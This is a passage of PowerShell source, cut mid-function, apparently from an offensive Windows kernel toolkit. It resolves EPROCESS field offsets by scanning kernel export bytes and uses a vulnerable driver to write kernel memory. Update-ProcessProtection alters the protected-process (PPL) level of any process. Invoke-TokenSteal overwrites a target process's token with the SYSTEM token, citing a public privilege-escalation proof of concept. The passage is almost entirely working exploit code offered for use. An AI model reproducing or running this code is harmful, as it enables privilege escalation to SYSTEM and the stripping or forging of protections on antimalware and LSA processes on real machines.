            } else {
                $Global:PEBOffset = 0x550
            }
        
        } else {
            # Fallback if the export can't be resolved
            $Global:PEBOffset = 0x550
        }
    }

    if ($null -eq $Global:ThreadListHeadOffset) {
        $ProcedureAddress = [IntPtr]::Zero
        $AnsiPtr = Init-NativeString -Value 'ExGetPreviousMode' -Encoding Ansi
        $Global:ntdll::LdrGetProcedureAddressForCaller($hModule, $AnsiPtr, 0, [ref]$ProcedureAddress, 0, 0) | Out-Null
        Free-NativeString -StringPtr $AnsiPtr

        if ($ProcedureAddress -ne 0L) {
            $FuncBytes = New-Object Byte[] 64
            [Marshal]::Copy($ProcedureAddress, $FuncBytes, 0, 64)

            $FoundPreviousModeOffset = 0
        
            for ($i = 0; $i -lt 56; $i++) {
                # --- Pattern 1: Windows 10 Style (MOVZX) ---
                if ($FuncBytes[$i] -eq 0x0F -and $FuncBytes[$i+1] -eq 0xB6) {
            
                    $ModRM = $FuncBytes[$i+2]
                    if ($ModRM -eq 0x80 -or $ModRM -eq 0x88 -or $ModRM -eq 0x81 -or $ModRM -eq 0x82) {
                        # Read the 4-byte displacement starting 3 bytes after index $i
                        $TargetAddress = [IntPtr]::Add($ProcedureAddress, $i + 3)
                        $FoundPreviousModeOffset = [Marshal]::ReadInt32($TargetAddress)
                        break
                    }
                }
        
                # --- Pattern 2: Windows 11 Style (MOV al, [reg + offset]) ---
                # 0x8A is the MOV opcode for moving a byte from memory to a register
                if ($FuncBytes[$i] -eq 0x8A) {
            
                    $ModRM = $FuncBytes[$i+1]
                    # 0x80, 0x81, 0x82, 0x88 represent 32-bit displacements relative to different registers (e.g., RAX, RCX)
                    if ($ModRM -eq 0x80 -or $ModRM -eq 0x88 -or $ModRM -eq 0x81 -or $ModRM -eq 0x82) {
                        # Read the 4-byte displacement starting 2 bytes after index $i
                        $TargetAddress = [IntPtr]::Add($ProcedureAddress, $i + 2)
                        $FoundPreviousModeOffset = [Marshal]::ReadInt32($TargetAddress)
                        break
                    }
                }
            }

            # Validation and Fallback
            if ($FoundPreviousModeOffset -ge 0x100 -and $FoundPreviousModeOffset -lt 0x1000) {
                $Global:PreviousModeOffset = $FoundPreviousModeOffset
            } else {
                # Default fallback if parsing fails completely
                $Global:PreviousModeOffset = 0x232
            }
        }
    }

    if ($null -eq $Global:ThreadListHeadOffset) {
        if ($Global:ActiveOffset -gt 0) {
            # Calculate relative to the dynamically found ActiveProcessLinks offset
            $Global:ThreadListHeadOffset = $Global:ActiveOffset + 0x198
        } else {
            # Architectural fallback matching your IDA dump structure
            $Global:ThreadListHeadOffset = 0x5E0
        }
    }

    if ($null -eq $Global:ProtectedProcessOffset) {
        $ProcedureAddress = [IntPtr]::Zero
        # Target the reliable protection helper export
        $AnsiPtr = Init-NativeString -Value 'PsGetProcessProtection' -Encoding Ansi
        $Global:ntdll::LdrGetProcedureAddressForCaller($hModule, $AnsiPtr, 0, [ref]$ProcedureAddress, 0, 0) | Out-Null
        Free-NativeString -StringPtr $AnsiPtr

        if ($ProcedureAddress -ne 0L) {
            # Read the assembly opcodes from memory
            $FuncBytes = New-Object Byte[] 16
            [Marshal]::Copy($ProcedureAddress, $FuncBytes, 0, 16)

            # Scan for '8A 81' -> mov al, [rcx + 4-byte displacement]
            for ($i = 0; $i -lt 10; $i++) {
                if ($FuncBytes[$i] -eq 0x8A -and $FuncBytes[$i+1] -eq 0x81) {
                
                    # The 4-byte displacement integer starts exactly 2 bytes past our index
                    $TargetAddress = [IntPtr]::Add($ProcedureAddress, $i + 2)
                    $Global:ProtectedProcessOffset = [Marshal]::ReadInt32($TargetAddress)
                    break
                }
            }
        }

        # Absolute fallback if pattern scanning fails on an abnormal build
        if ($null -eq $Global:ProtectedProcessOffset -or $Global:ProtectedProcessOffset -eq 0) {
            $Global:ProtectedProcessOffset = 0x87A  # Modern Windows 11 default
        }
    }

    if ($null -eq $Global:ExitStatusOffset) {
        $ProcedureAddress = [IntPtr]::Zero
        # Target the official NT kernel getter for ExitStatus
        $AnsiPtr = Init-NativeString -Value 'PsGetProcessExitStatus' -Encoding Ansi
        $Global:ntdll::LdrGetProcedureAddressForCaller($hModule, $AnsiPtr, 0, [ref]$ProcedureAddress, 0, 0) | Out-Null
        Free-NativeString -StringPtr $AnsiPtr

        if ($ProcedureAddress -ne 0L) {
            $FuncBytes = New-Object Byte[] 16
            [Marshal]::Copy($ProcedureAddress, $FuncBytes, 0, 16)

            # Scan for '8B 81' -> mov eax, [rcx + 4-byte displacement]
            for ($i = 0; $i -lt 10; $i++) {
                if ($FuncBytes[$i] -eq 0x8B -and $FuncBytes[$i+1] -eq 0x81) {
                    # The 4-byte displacement integer starts exactly 2 bytes past our index
                    $TargetAddress = [IntPtr]::Add($ProcedureAddress, $i + 2)
                    $Global:ExitStatusOffset = [Marshal]::ReadInt32($TargetAddress)
                    break
                }
            }
        }

        # Absolute fallback if pattern scanning fails (Matches your IDA dump)
        if ($null -eq $Global:ExitStatusOffset -or $Global:ExitStatusOffset -eq 0) {
            $Global:ExitStatusOffset = 0x7D4  
        }
    }

    if ($null -eq $Global:ImageFileNameOffset) {
        $ProcedureAddress = [IntPtr]::Zero
        # Fix 1: Exact export string name must be specified
        $AnsiPtr = Init-NativeString -Value 'PsGetProcessImageFileName' -Encoding Ansi
        $Global:ntdll::LdrGetProcedureAddressForCaller($hModule, $AnsiPtr, 0, [ref]$ProcedureAddress, 0, 0) | Out-Null
        Free-NativeString -StringPtr $AnsiPtr

        if ($ProcedureAddress -ne 0L) {
            $FuncBytes = New-Object Byte[] 16
            [Marshal]::Copy($ProcedureAddress, $FuncBytes, 0, 16)

            # Fix 2: Search loop modified to look for '48 8D 81' (lea rax, [rcx + offset])
            for ($i = 0; $i -lt 10; $i++) {
                if ($FuncBytes[$i] -eq 0x48 -and $FuncBytes[$i+1] -eq 0x8D -and $FuncBytes[$i+2] -eq 0x81) {
                
                    # Fix 3: Target displacement integer starts exactly 3 bytes after the index
                    $TargetAddress = [IntPtr]::Add($ProcedureAddress, $i + 3)
                    $Global:ImageFileNameOffset = [Marshal]::ReadInt32($TargetAddress)
                    break
                }
            }
        }

        # Absolute fallback handling
        if ($null -eq $Global:ImageFileNameOffset -or $Global:ImageFileNameOffset -eq 0) {
            $Global:ImageFileNameOffset = if ([Environment]::OSVersion.Version.Build -ge 22000) { 0x6A8 } else { 0x5A8 }
        }
    }

    # Execution block inside your script:
    $Bases = $null
    if ($Global:SystemProcessOffset -ne 0) {
        if ($ProcessID -gt 0) {
            $Bases = Get-KernelProcessBases -KernelAddress $KernelAddress -SystemProcessOffset $Global:SystemProcessOffset -ProcessID $ProcessID -FilterActiveProcess
        } else {
            $Bases = Get-KernelProcessBases -KernelAddress $KernelAddress -SystemProcessOffset $Global:SystemProcessOffset -FilterActiveProcess
        }
    }

    return $Bases
    
}
Function Update-ProcessProtection {
    Param(
        [Parameter(Mandatory = $true)]
        [IntPtr]$Eprocess,
        [ValidateSet('None', 'Authenticode', 'CodeGen', 'Antimalware', 'Lsa', 'Windows', 'WinTcb', 'WinSystem', 'App')]
        [String]$SignerValue = 'None', 
        [ValidateSet('None', 'PPL', 'PP')]
        [String]$TypeValue   = 'None'
    )

    $SignerInt = 0
    switch ($SignerValue) {
        'Authenticode'  { $SignerInt = 1 }
        'CodeGen'       { $SignerInt = 2 }
        'Antimalware'   { $SignerInt = 3 }
        'Lsa'           { $SignerInt = 4 }
        'Windows'       { $SignerInt = 5 }
        'WinTcb'        { $SignerInt = 6 }
        'WinSystem'     { $SignerInt = 7 }
        'App'           { $SignerInt = 8 }
    }

    $TypeInt = 0
    switch ($TypeValue) {
        'PPL'  { $TypeInt = 1 }
        'PP'   { $TypeInt = 2 }
    }

    $TargetAddress = [IntPtr]::Add($Eprocess, $Global:ProtectedProcessOffset)
    $NewValue = [Byte](($SignerInt -shl 4) -bor $TypeInt)
    $Target = ConvertFrom-EprocessStruct -EprocessBase $Eprocess

    Write-Host ("Updating protection for '{0}' (PID {1}) at 0x{2:X16} to 0x{3:X2}..." -f `
    $Target.ProcessName, $Target.ProcessID, $TargetAddress.ToInt64(), $NewValue) -ForegroundColor Cyan
    $Status = Write-VirtualAddress -VA $TargetAddress -Byte $NewValue

    if ($Status) {
        Write-Host "Success! Protection layout updated." -ForegroundColor Green
        return $true
    } else {
        Write-Host "Driver write transaction rejected or failed." -ForegroundColor Red
        return $false
    }
}
function Invoke-TokenSteal {
    [CmdletBinding()]
    param (
        # Option 1: Launch a new process with arguments
        [Parameter(ParameterSetName = "LaunchNew", Mandatory = $true)]
        [string]$FilePath,

        [Parameter(ParameterSetName = "LaunchNew")]
        [string]$Args = "",

        # Option 2: Target an existing process by its text name
        [Parameter(ParameterSetName = "TargetByName", Mandatory = $true)]
        [string]$ProcessName,

        # Option 3: Target a specific running process by its numeric ID
        [Parameter(ParameterSetName = "TargetByID", Mandatory = $true)]
        [int]$TargetPID,

        # Option 4: Target the current active PowerShell session
        [Parameter(ParameterSetName = "TargetCurrent", Mandatory = $true)]
        [switch]$CurrentProcess,
        
        # Source settings (Defaults to System PID 4)
        [int]$SourcePID = 4
    )

    # echoac-poc
    # https://github.com/kite03/echoac-poc/blob/main/PoC/PrivilegeEscalation/main.cpp

    $FinalTargetPID = $null

    switch ($PSCmdlet.ParameterSetName) {
        "LaunchNew" {
            $StartInfo = New-Object System.Diagnostics.ProcessStartInfo
            $StartInfo.FileName = $FilePath
            $StartInfo.Arguments = $Args
            $StartInfo.WindowStyle = "Normal"
            
            try {
                $TargetProcess = [System.Diagnostics.Process]::Start($StartInfo)
                $FinalTargetPID = $TargetProcess.Id
                Start-Sleep -Seconds 1
                Write-Output "Launched new process: $FilePath $Args (PID: $FinalTargetPID)"
            } catch {
                Write-Error "Failed to start process: $_"
                return
            }
        }
        "TargetByName" {
            $ExistingProc = Get-Process -Name $ProcessName -ErrorAction SilentlyContinue
            if (-not $ExistingProc) {
                Write-Error "Could not find a running process named '$ProcessName'"
                return
            }
            # Target the first instance found in the process table
            $FinalTargetPID = $ExistingProc[0].Id
            Write-Output "Found existing process '$ProcessName' with PID: $FinalTargetPID"
        }
        "TargetByID" {
            # Verify the PID actually exists before running driver logic
            $VerifyPID = Get-Process -Id $TargetPID -ErrorAction SilentlyContinue
            if (-not $VerifyPID) {
                Write-Error "Process ID $TargetPID is not currently running."
                return
            }
            $FinalTargetPID = $TargetPID
            Write-Output "Targeting explicitly provided PID: $FinalTargetPID"
        }
        "TargetCurrent" {
            $FinalTargetPID = $PID
            Write-Output "Targeting current active PowerShell session (PID: $FinalTargetPID)"
        }
    }

    $SourceEprocess = Query-EprocessStruct -ProcessID $SourcePID
    $RawTokenStr = ConvertFrom-EprocessStruct -EprocessBase $SourceEprocess | Select-Object -ExpandProperty TokenAddress
    $RawTokenInt = [Convert]::ToInt64($RawTokenStr, 16)
    $TargetEprocess = Query-EprocessStruct -ProcessID $FinalTargetPID
    $TokenHandle = [IntPtr]::Add($TargetEprocess, $Global:TokenOffset)
    $CleanedTokenInt = $RawTokenInt -band 0xFFFFFFFFFFFFFFF0

    $status = Write-VirtualAddress `
            -VA $TokenHandle `
            -Value ([System.BitConverter]::GetBytes([Int64]$CleanedTokenInt))
    return $status

    # 4. Use the driver to map memory and write the pointer
    $va = Map-VirtualAddress -VA $TokenHandle -DriverName mtxvxd -BlockSize 8
    if ($null -ne $va -and $va -ne 0L) {
        [marshal]::WriteInt64($va, $CleanedTokenInt)
        Unmap-VirtualAddress -MappedAddress $va -DriverName mtxvxd | out-null
        Write-Output "Success! Overwrote token pointer for PID $FinalTargetPID with System Token."
    } else {
        Write-Error "Failed to map virtual address via the driver."
    }
}
